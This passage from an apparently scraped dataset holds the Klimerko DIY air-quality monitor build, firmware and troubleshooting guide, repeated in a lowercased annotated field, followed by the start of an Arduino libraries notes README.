heights.\nShare Data\nGo to your \u201cDecon Klimerko\u201d device, click \u201cSettings\u201d in the upper right corner, go to \u201cShare data\u201d and share your data with \u201cVazduh gradjanima\u201d.\nYour device will now be visible on the map at Klimerko.org and can help the community be aware of the air quality!\nVisualize Data\nNow go to \u201cPinboards\u201d on the left side of AllThingsTalk Maker.\nYou should see a new pinboard named \u201cKlimerko\u201d. Select it if it isn\u2019t already selected.\nAll data from your Klimerko is visualized here:\nAir Quality (in textual form)\nValue shown will also have a corresponding background color.\nThis value is derived from PM10 values (as per regulations of Republic of Serbia):\nTextual Value PM 10 Value\nExcellent 0 - 20\nGood 21 - 40\nAcceptable 41 - 50\nPolluted 51 - 100\nVery Polluted 100 >\nActual PM1, PM2.5, PM10, Temperature, Humidity and Pressure data\nHistorical PM1, PM2.5, PM10, Temperature, Humidity and Pressure data\nLocation of your device on the map (that you\u2019ve set)\nWiFi Signal Strength of your Klimerko device\nPossible values (from good to bad): Excellent, Good, Decent, Bad, Horrible.\nThe values shown will also have a corresponding background color.\nDevice height (that you\u2019ve set)\nDevice reporting interval (minutes)\nYou can use this slider to control how often your Klimerko reports its data to AllThingsTalk. The default and recommended value is 15 minutes.\nYou\u2019re done!\nEnjoy your device and feel free to visit Klimerko.org and see your device along with all the other devices just like yours that are helping others be aware of the air pollution in your area!\nUpdating Firmware\nThis step is for those who've already built their Klimerko and wish to update its firmware to the latest version.\nTo check what Firmware version your Klimerko is on, you can:\nOpen your Klimerko device on your AllThingsTalk Maker:\nThe Firmware Version will be stored in the \"Firmware Version\" asset.\nUse Serial Monitor in Arduino IDE:\nKlimerko will output the Firmware Version in the first few lines once it boots.\nVersion 2.0.0 and above only: Activate WiFi Configuration Mode and click Configure WiFi:\nThe Firmware Version will be written in the bottom part of the page.\nTo exit WiFi Configuration Mode, go back and click \"EXIT\" or click the FLASH button once on NodeMCU.\nIf you are updating from a version before 2.0.0 to version 2.0.0 or above, you'll need to re-enter the credentials once you've updated your device.\nThis only applies to aforementioned cases due to changes in how data is stored in firmwares 2.0.0 and above.\nUpdating Wirelessly (OTA)\nUse this method if your Klimerko is currently on firmware version 2.0.0 or above.\nDownload Klimerko_Firmware.bin\nConnect your Klimerko to power.\nTake off the 3D printed cover (if present).\nEnter WiFi Configuration Mode by holding the \"FLASH\" button on the NodeMCU board for 2 seconds and then let go (Klimerko's LED should turn on and stay solid blue, indicating WiFi Configuration Mode is on).\nUsing your computer/smartphone, connect to WiFi Network \"KLIMERKO-XXX\" using password \"ConfigMode\"\nKlimerko's WiFi Configuration Portal may automatically open outside of your browser once you connect to it - ignore it in this case.\nOpen the browser on your computer/smartphone and navigate to 192.168.4.1 to manually open WiFi Configuration Portal.\nClick the UPDATE button.\nClick Browse and select the \"Klimerko_Firmware.bin\" file you downloaded earlier.\nClick the red UPDATE button and wait for it to confirm that the update is finished.\nYour Klimerko will reboot.\nUpdating using Arduino IDE\nUse this method if your Klimerko is on a firmware older than v2.0.0 or you're having issues with Over-The-Air updating.\nPlug in the USB cable into your Klimerko and your computer\nDownload the latest Klimerko Firmware\nUnzip the file, open it and go to \u201cKlimerko_Firmware\u201d folder\nOpen \u201cKlimerko_Firmware.ino\u201d with Arudino IDE\nMake sure you're running at least Arduino IDE version 1.8.15\nIf on Windows, click Help > About Arduino to check version\nIf on MacOS, click Arduino > About Arduino to check version\nIn case you're on a version older than 1.8.15, simply download Arduino IDE again and install it.\nIf on Windows, choose \u201cWindows installer, for Windows 7 and up\u201d when downloading\nGo to Tools > Board > Boards Manager\nSearch for \u201cesp8266\u201d by ESP8266 Community and click \"Install\" or \"Update\" if you already have it installed.\nIf for some reason you don't see the search result, make sure you've installed ESP8266 support\nNow go to Tools > Board and choose \u201cNodeMCU 1.0 (ESP-12E Module)\u201d\nGo to Tools > Upload Speed and choose 115200\nGo to Tools > Port and you should see COM and a number next to it. Choose it.\nIf you're running MacOS, choose /dev/cu.SLAB_USBtoUART or /dev/cu.usbserial-0001 (if you don't see it, install the driver first)\nGo to Tools > Erase Flash > Only Sketch\nGo to \u201cSketch\u201d > \u201cUpload\u201d and wait for the firmware to be uploaded to your Klimerko device\nOptional: Open Serial Monitor (Tools > Serial Monitor), set it to 115200 baud rate and check Klimerko diagnostic output to see if everything is working.\nAwesome! Your Klimerko is now updated to the latest version!\nTroubleshooting\nUpdate to newest firmware\nBefore anything else, make sure you've updated your Klimerko to the newest Firmware by following the Updating Firmware section.\nUse Serial Monitor\nTo see what's really going on under the hood, use the Serial Monitor tool provided in Arduino IDE:\nConnect your Klimerko to your computer\nOpen Arduino IDE\nSelect Tools > Port and select the correct port\nGo to Tools > Serial Monitor in Arduino IDE\nYou will now see diagnostic output from your Klimerko.\nIf your device is showing unintelligible text in Serial Monitor:\nMake sure your Serial Monitor is set to baud rate of 115200 (set this in the bottom right corner of Serial Monitor)\nCompilation issues\nIf you're having compiling issues (orange errors in the bottom of Arduino IDE), make sure that:\nYour Arduino IDE is at least version 1.8.15\nYou've downloaded the latest firmware from https://github.com/DesconBelgrade/Klimerko/archive/master.zip\nYou've selected the correct board and port as shown here\nYou're running the latest version of ESP8266 Core\nIn Arduino IDE, go to Tools > Board > Boards Manager\nSearch for \u201cesp8266\u201d by ESP8266 Community\nClick the Update button shown next to the result (if you don't see it, you're probably running the latest version).\nKlimerko can't see WiFi network\nMake sure the network you're trying to connect your Klimerko to is a 2.4GHz network, and not a 5GHz one as NodeMCU only supports 2.4GHz.\nMake sure you're in range.\nCan't connect to Klimerko to configure it\nIf you can't connect to your Klimerko when it's in WiFi Configuration Mode or you can't open WiFi Configuration Portal (192.168.4.1):\nDisconnect and reconnect to \"KLIMERKO-XXX\" WiFi Access Point and try again\nForget the \"KLIMERKO-XXX\" WiFi network on your device and try connecting again (password is \"ConfigMode\")\nTurn off WiFi on your device, wait a few seconds, and then turn it back on and try again\nKlimerko isn't connecting to WiFi or AllThingsTalk\nIf your device won't connect to WiFi or AllThingsTalk (blue LED on NodeMCU constantly blinking slowly):\nIf you updated your Klimerko's Firmware from a version below 2.0.0 to version 2.0.0 or above, you will need to re-enter your WiFi and AllThingsTalk credentials just this time, as noted in Updating Firmware.\nMake sure your credentials are correct. Check if you copied your AllThingsTalk credentials and your WiFi credentials correctly. Reconfigure credentials to make sure.\nIf you only need to update WiFi Credentials, you can leave \"AllThingsTalk Device ID\" and \"AllThingsTalk Device Token\" fields empty when saving.\nIf you only need to update AllThingsTalk Credentials, you can leave the WiFi fields empty when saving.\nIf you only need to update \"AllThingsTalk Device ID\", you can leave WiFi and \"AllThingsTalk Device Token\" fields empty when saving.\nIf you only need to update \"AllThingsTalk Device Token\", you can leave WiFi and \"AllThingsTalk Device ID\" fields empty when saving.\nTurn on WiFi Configuration Mode on your Klimerko by pressing and holding the FLASH button on the NodeMCU board.\nConnect to your Klimerko using WiFi and once the WiFi Configuration Portal is open, you should see the WiFi connection status at the bottom of the page.\nMake sure Klimerko is not too far away from your Router.\nMake sure your Router has internet access.\nAssets not being updated\nIf your device is connected, but some assets are not being updated (or only \"Interval\", \"WiFi Signal\" and \"Firmware Version\" assets are being updated):\nThis means one or both of your sensors aren't connected.\nIf assets \"PM1\", \"PM2.5\", \"PM10\" and \"Air Quality\" aren't being updated, your PMS7003 sensor isn't connected properly.\nIf assets \"Temperature\", \"Humidity\" and \"Pressure\" aren't being updated, your BME280 sensor isn't connected properly.\nCheck your wiring to make sure everything is connected properly.\nMake sure that there's no solder between any two pins on the board (either the NodeMCU or the BME280 sensor). If this is the case, it is causing a short-circuit and could break the device.\nMake sure that you haven't removed too much insulation from the wires. In this case, one wire could be touching another wire with the exposed part, causing a short-circuit. If that's the case, de-solder the wire, cut it shorter (only 2mm or less should be exposed before soldering) and solder it back.\nKlimerko won't turn on\nThe NodeMCU has a blue LED right above the small shiny metallic box. That LED blinks for a brief moment right when you plug the device into power. If yours doesn't blink when you plug it in, check the USB cable (and try another one if you have it). If that makes no difference, check the power supply (the adapter).\nMake sure that there's no solder between any two pins on the board (either the NodeMCU or the BME280 sensor). If this is the case, it is causing a short-circuit and could break the device.\nMake sure that you haven't removed too much insulation from the wires. In this case, one wire could be touching another wire with the exposed part, causing a short-circuit. If that's the case, de-solder the wire, cut it shorter (so only 2mm or less is exposed) and solder it back.\nFactory Reset your Klimerko\nPress and hold the FLASH button on the NodeMCU board for at least 15 seconds.\nThe blue LED should flash rapidly for 2 seconds and then stay on.\nYour Klimerko has now deleted all credentials from itself and will restart shortly.\nOnce the LED turns off, Klimerko has been restarted.\nThe LED will now blink slowly, indicating it's trying to connect to WiFi and AllThingsTalk (but it can't, since there's no credentials)\nYou can now follow Configuring Klimerko Credentials again to enter the credentials.", "link": "https://github.com/DesconBelgrade/Klimerko", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "\u201cklimerko\u201d air quality monitoring station\n\"klimerko\" is the continuation of the winning project from descon 4.0 2018.\nsee live data from all klimerko devices: klimerko.org\nthis is an affordable diy air quality station that measures particulate matter concentration as well as temperature, humidity and pressure.\nit publishes data to your allthingstalk maker cloud (free) where you're able to visualize data, see it historically and control the device.\ncontinue reading to find out how to build your own, or watch the video below that covers the process.\nnotice: the video was created before the release of klimerko firmware v2.0.0, which introduced wifi configuration mode, so the process of connecting the device to wifi and allthingstalk shown in the video is outdated.\nhaving issues? go to the troubleshooting section.\nto update your klimerko, go to updating firmware.\ntable of contents\nthis guide is in chronological order, so try not to skip through parts if you're not sure about it.\nhardware build\nhardware required\ntools required\n3d case preparation\npms7003 sensor preparation\nbme280 sensor preparation\nnodemcu preparation\ncloud platform (1/2)\nsoftware\ninstalling esp8266 support\nuploading firmware\nconfiguring klimerko credentials\ncloud platform (2/2)\nconfigure device\nshare data\nvisualize data\nupdating firmware\nupdating wirelessly (ota)\nupdating using arduino ide\ntoubleshooting\nuse serial monitor\ncompilation issues\nklimerko can't see wifi network\ncan't connect to klimerko to configure it\nklimerko isn't connecting to wifi or allthingstalk\nassets not being updated\nklimerko won't turn on\nfactory reset your klimerko\nhardware build\nthis diagram shows an overview of how klimerko works\nhardware required\nyou'll need these components to follow this guide:\npreviously, some of the components below were clickable so you could buy them right away, but shipping to balkans on some websites became 10x more expensive than the components themselves, therefore the list now only contains the names, description and a photo of the items you need to buy.\nyou can search for these components on ebay, banggood, aliexpress or your local electronics store/website.\nnodemcu (amica, with cp2102 chip)\ntry to avoid the cheapest ones as they're using a different pinout and a weaker chg340 chip.\nit should look exactly like this:\nplantower pms7003 air quality sensor\nget the one with a connector and a bridge board.\nshould look exactly like this:\nbosch bme280 temperature/humidity/pressure sensor\nmake sure to get the bme280 and not the cheaper bmp280.\nthere are variants with 6 pins, and if you find them to be cheaper than the ones with 4 pins (as shown below), you can buy that as well - you just won't use additional 2 pins.\nit should look exactly like this:\nusb power adapter (5v, minimum 250ma/0.25a)\nmicrousb cable\n4x wires (each at least 13cm long)\noptional: 3d printed case for the device (stl files), which comprises of:\ncomponents base\nweather-resistant cover\nflat stand\nwall-mount holder\nnon-3d-printed: 5x screws (for plastic, 3x5mm) (7x screws if you\u2019re going to wall-mount the device)\ntools required\nyou\u2019re going to need the following tools at minimum to complete the project:\nsoldering iron\nsolder\nscissors or a wire stripper\nscrewdriver (required only if using 3d printed case)\nhardware assembly\nonce you\u2019ve got all the components and tools ready, it\u2019s time to begin the assembly process.\nwhen soldering, make sure that there's no solder between any two pins (connection holes in the board) on any of the components before plugging the device into a power source.\npay attention to vin and gnd pins on the nodemcu, because shorting (connecting) those two pins together will fry nodemcu and possibly the power source it's connected to.\n3d case preparation\nyou can print your own klimerko case using a 3d printer using the 3d print files. if you don't have a 3d printer, your local hacker/makerspace most likely has one!\nin case you're not following this guide at a workshop: you're still able to build this device if you don't have the 3d case. you'll just need to tinker and figure out how to place the device in a secure location away from rain/sun (but in an open space so it can detect pollution properly)\ndepending on your use case, you can use either the flat stand or the wall-mounted holder. if you wish to wall-mount the device, use 2 screws to mount the holder to a wall. you\u2019ll be able to easily attach and detach the device from the wall.\nfor now, disassemble the case and put away all the parts except for the components base, where you\u2019ll be placing all the components.\npms7003 sensor preparation\nfirst, make sure not to remove the blue plastic cover from the pms7003 sensor as it helps it fit into the 3d case better.\nplace the pms7003 sensor into the components base of the 3d case with the connection port of pms7003 facing outwards in upper right side.\nplug in the connector cable into the bridge board.\nbecause we don\u2019t need excess cabling, removal of the unnecessary wires from the connector cable is suggested. in order to know which wires to pull, make sure the connector cable is plugged into the bridge board so that you can see the markings on the board that correspond to the wires. to remove the wires, pull them with medium force until they\u2019re detached from the connector. these are the wires to pull (marked red):\nnc (first one)\nnc (second one)\nrst\nset the only wires left attached should be tx, rx, gnd and vcc.\nmeasure ~13cm of all 4 remaining wires from the connector cable and cut the rest, so you\u2019re left with the connector at one end and cut wires on the other.\nusing scissors or a wire stripper, remove the insulation ~2mm from the end of each wire, so you\u2019re left with clear copper at the ends.\nplug the bridge board (with the connector cable in) into the pms7003 sensor.\nroute the wires through the circular hole in the components base of the 3d case so it reaches the other side of the base.\nbme280 sensor preparation\ntake the 4 wires you have prepared (not to be confused with the pms7003 wires) and strip (remove insulation) ~2mm from each end of each wire so that you have 4 wires with all ends stripped.\nsolder those 4 wires to pins sda, scl, gnd, vcc/vin on the bme280.\nif you have a 6-pin version of bme280, the csb and sdo pins simply aren't used.\nmake sure the pms7003 sensor is seated properly (because bme280 goes above it), and only then proceed to the next step.\nmount the bme280 sensor in place by screwing it to the hole in the upper right side of the 3d case (above the pms7003).\nroute the wires through the circular hole in the components base of the 3d case so it reaches the other side of the base.\nyou have now completed the setup of the sensor side of the components base. next up, the nodemcu side.\nnodemcu preparation\nyou should now have 8 wires coming through the circular hole leading to the nodemcu side of the 3d case.\nsolder the wires to the nodemcu board:\nplease double check to make sure you\u2019re soldering the correct wires (coming from the sensors) to the nodemcu board.\nsensor sensor wire nodemcu pin\npms7003 vcc vin\npms7003 gnd gnd (any gnd pin works)\npms7003 rx d6\npms7003 tx d5\nbme280 vcc/vin 3v3 (any 3v3 pin works)\nbme280 gnd gnd (any gnd pin works)\nbme280 scl d1\nbme280 sda d2\nyou have now finished all steps that require soldering.\nnow use 4 screws to place the nodemcu in its spot in the components base of the 3d case.\ndouble check all the connections and if everything is as it should be.\nput the weather-resistant cover of the 3d case over the components base (it's better to do this once everything is done and device is connected, though)\ncongratulations, you\u2019ve assembled the device! now onto the software side.\ncloud platform (1/2)\nhead over to allthingstalk maker and create a free account\nsign in\nclick \u201cplayground\u201d\nin \"devices\", click \"+ new device\"\nchoose \u201cdescon klimerko\u201d\nclick \u201csettings\u201d in the upper right corner\nclick \u201cauthentication\u201d\nwrite down your device id and device token\nsoftware\nfor all of the steps below, you'll need arduino ide (integrated development environment).\nthis is a -----> tool !!!  that's used to send the \"firmware\" or \"program\" to your device.\nif you already have arduino ide, make sure it's at least version 1.8.15\ndownload and install arduino ide (choose \u201cwindows installer, for windows xp and up\u201d if you\u2019re on windows, otherwise it'll download the windows store version, which might give you issues).\nif you're running apple's macos, also download and install the cp2102 driver in order to enable your mac to recognize klimerko for further steps.\ninstalling esp8266 support\nesp8266 is the \"brains\" or \"processor\" of the nodemcu, but arduino ide doesn't support it out-of-the-box. that's an easy one:\nopen arduino ide\ngo to file > preferences\nin the additional boards manager urls, enter http://arduino.esp8266.com/stable/package_esp8266com_index.json and click ok\ngo to tools > board > boards manager\nsearch for \u201cesp8266\u201d by esp8266 community\nclick install\nonce done, close the window.\nuploading firmware\nyour nodemcu's \"brain\" is empty at the moment. let's teach it what it needs to do by uploading the program to it:\nplug in the usb cable into your klimerko device and your computer\ndownload https://github.com/desconbelgrade/klimerko/archive/master.zip\nunzip the file, open it and go to \u201cklimerko_firmware\u201d folder\nopen \u201cklimerko_firmware.ino\u201d with arudino ide\nnow go to tools > board and choose \u201cnodemcu 1.0 (esp-12e module)\u201d\ngo to tools > upload speed and choose 115200\ngo to tools > port and you should see com and a number next to it. choose it.\nif you're running macos, choose /dev/cu.slab_usbtouart\ngo to \u201csketch\u201d > \u201cupload\u201d and wait for the firmware to be uploaded to your klimerko device\nconfiguring klimerko credentials\nsince klimerko firmware version 2.0.0, the process of entering wifi & platform credentials has been immensely simplified by introducing wifi configuration mode, a feature where klimerko itself becomes a wifi access point to which you can connect to using your computer or smartphone and then configure the credentials using a simple web interface that opens up automatically once you're connected to your klimerko.\nyou need tell your klimerko which credentials to use to connect to the platform and to which wifi to connect to:\nmake sure your klimerko is connected to power.\nlift your klimerko's cover to expose the nodemcu board.\npress and hold the flash button for 2 seconds and then let go.\nthe blue led on the nodemcu should turn on and stay on. this indicates the wifi configuration mode is currently active and you can connect to your klimerko.\nusing your computer or a smartphone, search for and connect to wifi network \"klimerko-xxx\" (the x's are numbers) using password \"configmode\".\nyour device should automatically open klimerko's wifi configuration portal. if it doesn't, navigate to 192.168.4.1 in your browser.\nclick the first \"configure wifi\" button.\na list of available wifi networks will be shown, along with a field to enter your allthingstalk device id and device token.\nnodemcu only supports 2.4ghz, so make sure the network you're trying to connect your klimerko to is not a 5ghz network.\nselect your wifi network from the list (or manually enter wifi network name if you're not in range of the network you plan to use your klimerko on), enter your wifi password and copy/paste the allthingstalk device id and device token that you noted in previous step (cloud platform credentials)\nif you are updating your credentials, it is possible to only update some of them by leaving other fields empty. the empty fields will not overwrite the values stored in memory when saving.\nclick \"save\".\nklimerko has now automatically shut down the wifi configuration mode (the blue led stops shining constantly) and your computer/smartphone will disconnect from \"klimerko-xxx\" network. the wifi configuration portal will automatically close on your computer/smartphone only if it was automatically opened. otherwise, you'll need to close the browser tab.\nyour klimerko will now attempt to connect to wifi and allthingstalk, indicated by slow blinking of the led light.\nobserve the led on the nodemcu. if it blinks quickly a few times and then turns off completely, your klimerko is connected to both wifi and allthingstalk. otherwise, repeat the process (the credentials could be incorrect) or check the troubleshooting section.\nthe blue led light on nodemcu blinks slowly (in 1 second intervals) when klimerko is trying to connect to wifi or allthingstalk (or if the connection can't be established).\nif it blinks rapidly a few times and then turns off, the connection to wifi and allthingstalk has been made succesfully.\nif it's turned on constantly, it means the wifi configuration mode is currently active and you can connect to your klimerko using your smartphone.\nif you wish to turn off wifi configuration mode without configuring your klimerko, press the \"flash\" button on your nodemcu quickly, once. the constant blue led should turn off.\ncloud platform (2/2)\nall of the data from your klimerko is available on your allthingstalk maker.\nother than raw actual and historical air quality values, you\u2019re able to see your air quality in a textual form at a glance, see the wifi signal strength of your klimerko and control how often your klimerko publishes data.\nyou\u2019ll also get notifications if your klimerko goes offline for any reason.\nconfigure device\nopen allthingstalk maker, go to \u201cdevices\u201d and select your new \u201cdescon klimerko\u201d device.\nyou\u2019ll see all assets of your device (stuff that it can report and things you can control).\nmake sure to keep the data (that you\u2019re about to set below) updated if you move your device\nclick on the \u201clocation\u201d asset and select the location of your klimerko on the map\nclick on the \u201cheight\u201d asset and set the height of your device (in meters) by adding a value right next to \"value\": and clicking the \u2714\ufe0f button when done (below is an example of 10 meters height):\n{\n\"at\": \"2019-10-18t11:28:04.554z\",\n\"value\": 10\n}\nthis needs to be done since air pollution readings are different on different heights.\nshare data\ngo to your \u201cdecon klimerko\u201d device, click \u201csettings\u201d in the upper right corner, go to \u201cshare data\u201d and share your data with \u201cvazduh gradjanima\u201d.\nyour device will now be visible on the map at klimerko.org and can help the community be aware of the air quality!\nvisualize data\nnow go to \u201cpinboards\u201d on the left side of allthingstalk maker.\nyou should see a new pinboard named \u201cklimerko\u201d. select it if it isn\u2019t already selected.\nall data from your klimerko is visualized here:\nair quality (in textual form)\nvalue shown will also have a corresponding background color.\nthis value is derived from pm10 values (as per regulations of republic of serbia):\ntextual value pm 10 value\nexcellent 0 - 20\ngood 21 - 40\nacceptable 41 - 50\npolluted 51 - 100\nvery polluted 100 >\nactual pm1, pm2.5, pm10, temperature, humidity and pressure data\nhistorical pm1, pm2.5, pm10, temperature, humidity and pressure data\nlocation of your device on the map (that you\u2019ve set)\nwifi signal strength of your klimerko device\npossible values (from good to bad): excellent, good, decent, bad, horrible.\nthe values shown will also have a corresponding background color.\ndevice height (that you\u2019ve set)\ndevice reporting interval (minutes)\nyou can use this slider to control how often your klimerko reports its data to allthingstalk. the default and recommended value is 15 minutes.\nyou\u2019re done!\nenjoy your device and feel free to visit klimerko.org and see your device along with all the other devices just like yours that are helping others be aware of the air pollution in your area!\nupdating firmware\nthis step is for those who've already built their klimerko and wish to update its firmware to the latest version.\nto check what firmware version your klimerko is on, you can:\nopen your klimerko device on your allthingstalk maker:\nthe firmware version will be stored in the \"firmware version\" asset.\nuse serial monitor in arduino ide:\nklimerko will output the firmware version in the first few lines once it boots.\nversion 2.0.0 and above only: activate wifi configuration mode and click configure wifi:\nthe firmware version will be written in the bottom part of the page.\nto exit wifi configuration mode, go back and click \"exit\" or click the flash button once on nodemcu.\nif you are updating from a version before 2.0.0 to version 2.0.0 or above, you'll need to re-enter the credentials once you've updated your device.\nthis only applies to aforementioned cases due to changes in how data is stored in firmwares 2.0.0 and above.\nupdating wirelessly (ota)\nuse this method if your klimerko is currently on firmware version 2.0.0 or above.\ndownload klimerko_firmware.bin\nconnect your klimerko to power.\ntake off the 3d printed cover (if present).\nenter wifi configuration mode by holding the \"flash\" button on the nodemcu board for 2 seconds and then let go (klimerko's led should turn on and stay solid blue, indicating wifi configuration mode is on).\nusing your computer/smartphone, connect to wifi network \"klimerko-xxx\" using password \"configmode\"\nklimerko's wifi configuration portal may automatically open outside of your browser once you connect to it - ignore it in this case.\nopen the browser on your computer/smartphone and navigate to 192.168.4.1 to manually open wifi configuration portal.\nclick the update button.\nclick browse and select the \"klimerko_firmware.bin\" file you downloaded earlier.\nclick the red update button and wait for it to confirm that the update is finished.\nyour klimerko will reboot.\nupdating using arduino ide\nuse this method if your klimerko is on a firmware older than v2.0.0 or you're having issues with over-the-air updating.\nplug in the usb cable into your klimerko and your computer\ndownload the latest klimerko firmware\nunzip the file, open it and go to \u201cklimerko_firmware\u201d folder\nopen \u201cklimerko_firmware.ino\u201d with arudino ide\nmake sure you're running at least arduino ide version 1.8.15\nif on windows, click help > about arduino to check version\nif on macos, click arduino > about arduino to check version\nin case you're on a version older than 1.8.15, simply download arduino ide again and install it.\nif on windows, choose \u201cwindows installer, for windows 7 and up\u201d when downloading\ngo to tools > board > boards manager\nsearch for \u201cesp8266\u201d by esp8266 community and click \"install\" or \"update\" if you already have it installed.\nif for some reason you don't see the search result, make sure you've installed esp8266 support\nnow go to tools > board and choose \u201cnodemcu 1.0 (esp-12e module)\u201d\ngo to tools > upload speed and choose 115200\ngo to tools > port and you should see com and a number next to it. choose it.\nif you're running macos, choose /dev/cu.slab_usbtouart or /dev/cu.usbserial-0001 (if you don't see it, install the driver first)\ngo to tools > erase flash > only sketch\ngo to \u201csketch\u201d > \u201cupload\u201d and wait for the firmware to be uploaded to your klimerko device\noptional: open serial monitor (tools > serial monitor), set it to 115200 baud rate and check klimerko diagnostic output to see if everything is working.\nawesome! your klimerko is now updated to the latest version!\ntroubleshooting\nupdate to newest firmware\nbefore anything else, make sure you've updated your klimerko to the newest firmware by following the updating firmware section.\nuse serial monitor\nto see what's really going on under the hood, use the serial monitor tool provided in arduino ide:\nconnect your klimerko to your computer\nopen arduino ide\nselect tools > port and select the correct port\ngo to tools > serial monitor in arduino ide\nyou will now see diagnostic output from your klimerko.\nif your device is showing unintelligible text in serial monitor:\nmake sure your serial monitor is set to baud rate of 115200 (set this in the bottom right corner of serial monitor)\ncompilation issues\nif you're having compiling issues (orange errors in the bottom of arduino ide), make sure that:\nyour arduino ide is at least version 1.8.15\nyou've downloaded the latest firmware from https://github.com/desconbelgrade/klimerko/archive/master.zip\nyou've selected the correct board and port as shown here\nyou're running the latest version of esp8266 core\nin arduino ide, go to tools > board > boards manager\nsearch for \u201cesp8266\u201d by esp8266 community\nclick the update button shown next to the result (if you don't see it, you're probably running the latest version).\nklimerko can't see wifi network\nmake sure the network you're trying to connect your klimerko to is a 2.4ghz network, and not a 5ghz one as nodemcu only supports 2.4ghz.\nmake sure you're in range.\ncan't connect to klimerko to configure it\nif you can't connect to your klimerko when it's in wifi configuration mode or you can't open wifi configuration portal (192.168.4.1):\ndisconnect and reconnect to \"klimerko-xxx\" wifi access point and try again\nforget the \"klimerko-xxx\" wifi network on your device and try connecting again (password is \"configmode\")\nturn off wifi on your device, wait a few seconds, and then turn it back on and try again\nklimerko isn't connecting to wifi or allthingstalk\nif your device won't connect to wifi or allthingstalk (blue led on nodemcu constantly blinking slowly):\nif you updated your klimerko's firmware from a version below 2.0.0 to version 2.0.0 or above, you will need to re-enter your wifi and allthingstalk credentials just this time, as noted in updating firmware.\nmake sure your credentials are correct. check if you copied your allthingstalk credentials and your wifi credentials correctly. reconfigure credentials to make sure.\nif you only need to update wifi credentials, you can leave \"allthingstalk device id\" and \"allthingstalk device token\" fields empty when saving.\nif you only need to update allthingstalk credentials, you can leave the wifi fields empty when saving.\nif you only need to update \"allthingstalk device id\", you can leave wifi and \"allthingstalk device token\" fields empty when saving.\nif you only need to update \"allthingstalk device token\", you can leave wifi and \"allthingstalk device id\" fields empty when saving.\nturn on wifi configuration mode on your klimerko by pressing and holding the flash button on the nodemcu board.\nconnect to your klimerko using wifi and once the wifi configuration portal is open, you should see the wifi connection status at the bottom of the page.\nmake sure klimerko is not too far away from your router.\nmake sure your router has internet access.\nassets not being updated\nif your device is connected, but some assets are not being updated (or only \"interval\", \"wifi signal\" and \"firmware version\" assets are being updated):\nthis means one or both of your sensors aren't connected.\nif assets \"pm1\", \"pm2.5\", \"pm10\" and \"air quality\" aren't being updated, your pms7003 sensor isn't connected properly.\nif assets \"temperature\", \"humidity\" and \"pressure\" aren't being updated, your bme280 sensor isn't connected properly.\ncheck your wiring to make sure everything is connected properly.\nmake sure that there's no solder between any two pins on the board (either the nodemcu or the bme280 sensor). if this is the case, it is causing a short-circuit and could break the device.\nmake sure that you haven't removed too much insulation from the wires. in this case, one wire could be touching another wire with the exposed part, causing a short-circuit. if that's the case, de-solder the wire, cut it shorter (only 2mm or less should be exposed before soldering) and solder it back.\nklimerko won't turn on\nthe nodemcu has a blue led right above the small shiny metallic box. that led blinks for a brief moment right when you plug the device into power. if yours doesn't blink when you plug it in, check the usb cable (and try another one if you have it). if that makes no difference, check the power supply (the adapter).\nmake sure that there's no solder between any two pins on the board (either the nodemcu or the bme280 sensor). if this is the case, it is causing a short-circuit and could break the device.\nmake sure that you haven't removed too much insulation from the wires. in this case, one wire could be touching another wire with the exposed part, causing a short-circuit. if that's the case, de-solder the wire, cut it shorter (so only 2mm or less is exposed) and solder it back.\nfactory reset your klimerko\npress and hold the flash button on the nodemcu board for at least 15 seconds.\nthe blue led should flash rapidly for 2 seconds and then stay on.\nyour klimerko has now deleted all credentials from itself and will restart shortly.\nonce the led turns off, klimerko has been restarted.\nthe led will now blink slowly, indicating it's trying to connect to wifi and allthingstalk (but it can't, since there's no credentials)\nyou can now follow configuring klimerko credentials again to enter the credentials.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000592, "year": null}, {"Unnamed: 0": 2636, "autor": 596, "date": null, "content": "Arduino\nNotes on Arduino libraries and sketches and other related stuff.\nMy Libraries and projects\nJLed\nlog4arduino\neps32-aws-iot\nUSB Spinner Game Controller\nSimpson Device (virtual Drinking Bird)\nSketches\nInterfacing SSD1306 based OLED displays (SPI)\nColorduino RGB matrix driver\nCJMCU-8x8 RGB matix\nWEMOS D-Duino\nESP32 TTGO\nHeltec WiFi Lora 32\nRaspberry Pi 480x320 SPI TFT Display (3.5 inches)\nFurther info\nSipeed Longan Nano RISC-V proto board (GD32VF103CBT6)\nDFU mode\nUpload demo sketch\nTODO\nRaspberry Pi HDMI LCD display (800x480, 4\")\nRaspberry Pi Pico (RP2040)\nPCA9685 driver board\nMP3 Modules\nVS1053 notes\nMisc\nWS2812 protection circuit\nAuthor\nMy Libraries and projects\nJLed\nJLed is an Arduino library to control LEDs. It uses a non-blocking approach and can control LEDs in simple (on/off) and complex (blinking, breathing) ways in a time-driven manner.\n// breathe LED (on gpio 9) 6 times for 1500ms, waiting for 500ms after each run\n#include <jled.h>\nauto led_breathe = JLed(9).Breathe(1500).Repeat(6).DelayAfter(500);\nvoid setup() { }\nvoid loop() {\nled_breathe.Update();\n}\nhttps://github.com/jandelgado/jled\nlog4arduino\nA lightweight, no-frills logging library for Arduino & friends.\nLOG(\"hello, log4arduino.\");\ndelay(42);\nLOG(\"use %s formatting: %d %c %d %c %d\", \"printf\", 9, '+', 1, '=', 10);\nAllows simple printf-like formatting and shows current time in millis and available memory, e.g.\n0(1623): hello, log4arduino.\n42(1609): use printf formatting: 9 + 1 = 10\nhttps://github.com/jandelgado/log4arduino\neps32-aws-iot\nCode, tools and instructions on how to connect ESP32 securely to the AWS IOT cloud.\nhttps://github.com/jandelgado/esp32-aws-iot\nUSB Spinner Game Controller\nAn Arduino Pro Micro based USB spinner (like a paddle) game controller. Great to play games like e.g. Arkanoid. Simulates an USB mouse and needs no drivers.\nhttps://github.com/jandelgado/usb-spinner\nSimpson Device (virtual Drinking Bird)\nSimulates an USB mouse using an Attiny85 (Digispark board) and randomly moves your mouse (see The Simpsons S07E07).\nhttps://github.com/jandelgado/simpson-device\nSketches\nTo build the demo sketches you can either copy the folders to the source folder of your Arduino IDE or use PlatformIO and the provided makefiles, e.g.:\n$ cd cjmcu_8x8_sample\n$ make upload\nThe following make targets can be used: run, envdump, clean, upload, monitor\nInterfacing SSD1306 based OLED displays (SPI)\nssd1306_sample_adafruit - sample code for ssd1306 based oled display. see wiki for detailed information\nssd1306_sample_u8g - sample code for ssd1306 based oled display. see wiki for detailed information\nColorduino 